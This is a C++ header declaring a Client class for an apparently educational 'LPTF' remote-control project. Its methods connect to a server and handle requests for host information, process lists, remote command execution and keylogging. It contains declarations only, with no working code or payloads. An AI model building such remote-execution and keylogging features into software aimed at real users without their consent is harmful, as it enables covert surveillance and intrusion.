#ifndef CLIENT_HPP
#define CLIENT_HPP

#include "../server/LPTF_socket.hpp"
#include "../protocole/LPTF_Protocol.hpp"
#include "RemoteControl.hpp"
#include <string>
#include <memory>

class Client {
private:
    std::unique_ptr<LPTF_Socket> socket_;
    std::string server_ip_;
    int server_port_;
    bool is_connected_;
    std::unique_ptr<RemoteControl> remote_control_;

public:
    Client();
    Client(const std::string& server_ip, int server_port);
    Client(const Client& other);
    Client& operator=(const Client& other);
    ~Client();
    
    Client(Client&& other) noexcept;
    Client& operator=(Client&& other) noexcept;
    
    bool connect_to_server();
    bool send_message(const std::string& message);
    bool receive_message(std::string& message);
    void disconnect();
    
    const std::string& get_server_ip() const;
    int get_server_port() const;
    bool get_is_connected() const;
    
    void set_server_info(const std::string& ip, int port);
    
    void run_interactive();
    void run_remote_control_demo();
    void test_keylogger();
    
    bool handle_remote_control_request(const LPTF::LPTF_Packet& request);

private:
    void copy_from(const Client& other);
    void move_from(Client&& other) noexcept;
    void reset();
    
    void process_host_info_request();
    void process_process_list_request();
    void process_execute_command_request(const LPTF::LPTF_Packet& request);
    void process_keylogger_request(const LPTF::LPTF_Packet& request);
};

#endif // CLIENT_HPP